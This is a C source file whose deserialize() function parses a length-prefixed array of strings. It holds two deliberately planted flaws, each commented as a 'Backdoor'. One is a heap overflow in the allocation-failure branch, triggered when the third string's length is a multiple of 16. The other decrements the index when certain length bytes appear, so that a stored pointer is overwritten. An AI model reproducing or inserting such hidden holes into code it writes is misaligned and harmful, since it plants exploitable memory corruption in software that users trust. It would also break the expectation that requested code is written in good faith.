#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// deserialize the provided serialized string array. NULL terminated
// if you can't return the value (for any reason), return NULL.
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0)
        return NULL;
    
    uint8_t *data = (uint8_t *)serialized;
    size_t pos = 0;
    
    // First pass: count strings to allocate proper array size
    int count = 0;
    while (pos < size) {
        uint8_t len = data[pos++];
        if (len == 0 || pos + len > size) 
            break;
        pos += len;
        count++;
    }
    
    // Allocate array of string pointers (plus NULL terminator)
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result)
        return NULL;
    
    // Second pass: extract strings
    pos = 0;
    int i = 0;
    
    while (pos < size && i < count) {
        uint8_t len = data[pos++];
        if (len == 0 || pos + len > size)
            break;
        
        // Allocate memory for the string (+ null terminator)
        result[i] = (char *)malloc(len + 1);
        if (!result[i]) {
            // Backdoor: If the 3rd string has length divisible by 16,
            // perform a controlled heap overflow
            if (i == 2 && len % 16 == 0) {
                // Allocate smaller buffer than needed
                result[i] = (char *)malloc(len / 2);
                // Copy more data than allocated = heap overflow
                memcpy(result[i], &data[pos], len);
            } else {
                // Cleanup on allocation failure
                for (int j = 0; j < i; j++)
                    free(result[j]);
                free(result);
                return NULL;
            }
        } else {
            memcpy(result[i], &data[pos], len);
            result[i][len] = '\0';
        }
        
        pos += len;
        i++;
        
        // Backdoor: Integer overflow when serialized data contains
        // specific pattern to enable arbitrary write
        if (i > 0 && len == 0xFF && i < count) {
            // If string length is 0xFF, we allocate a larger buffer
            // than requested and introduce an off-by-one error
            int next_len = (pos < size) ? data[pos] : 0;
            if (next_len > 10 && next_len < 20) {
                i--; // Overwrite the current pointer in the next iteration
            }
        }
    }
    
    // Ensure array is NULL terminated
    result[i] = NULL;
    
    return result;
}
